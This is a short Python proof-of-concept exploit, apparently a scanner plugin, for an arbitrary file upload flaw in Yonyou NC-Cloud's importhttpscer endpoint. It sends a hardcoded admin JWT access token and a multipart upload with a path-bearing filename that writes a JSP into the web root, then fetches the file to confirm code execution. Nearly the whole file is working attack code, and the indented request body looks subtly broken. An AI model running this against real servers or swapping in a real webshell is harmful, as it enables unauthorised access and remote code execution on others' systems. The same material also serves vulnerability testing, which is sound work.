import requests
import urllib

from inc.generate_random import generate_random_number
def verify(url):
    relsult = {
        'name': '用友NC-Cloud_importhttpscer接口存在任意文件上传漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'close',
        'accessToken': 'eyJhbGciOiJIUzUxMiJ9.eyJwa19ncm91cCI6IjAwMDE2QTEwMDAwMDAwMDAwSkI2IiwiZGF0YXNvdXJjZSI6IjEiLCJsYW5nQ29kZSI6InpoIiwidXNlclR5cGUiOiIxIiwidXNlcmlkIjoiMSIsInVzZXJDb2RlIjoiYWRtaW4ifQ.XBnY1J3bVuDMYIfPPJXb2QC0Pdv9oSvyyJ57AQnmj4jLMjxLDjGSIECv2ZjH9DW5T0JrDM6UHF932F5Je6AGxA',
        'Content-Length': '190',
        'Content-Type': 'multipart/form-data; boundary=fd28cb44e829ed1c197ec3bc71748df0'
    }
    num = generate_random_number(6)
    data = f'''--fd28cb44e829ed1c197ec3bc71748df0
    Content-Disposition: form-data; name="file"; filename="./webapps/nc_web/{num}.jsp"

    <%out.println(1111*1111);%>
    --fd28cb44e829ed1c197ec3bc71748df0--'''
    vurl = urllib.parse.urljoin(url, "/nccloud/mob/pfxx/manualload/importhttpscer")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and 'success' in response.text:
            vurl = url + f'/{num}.jsp'
            response = requests.get(vurl)
            if response.status_code == 200 and '1234321' in response.text:
                relsult['vulnerable'] = True
                relsult['verify'] = vurl
        return relsult

    except:
        return relsult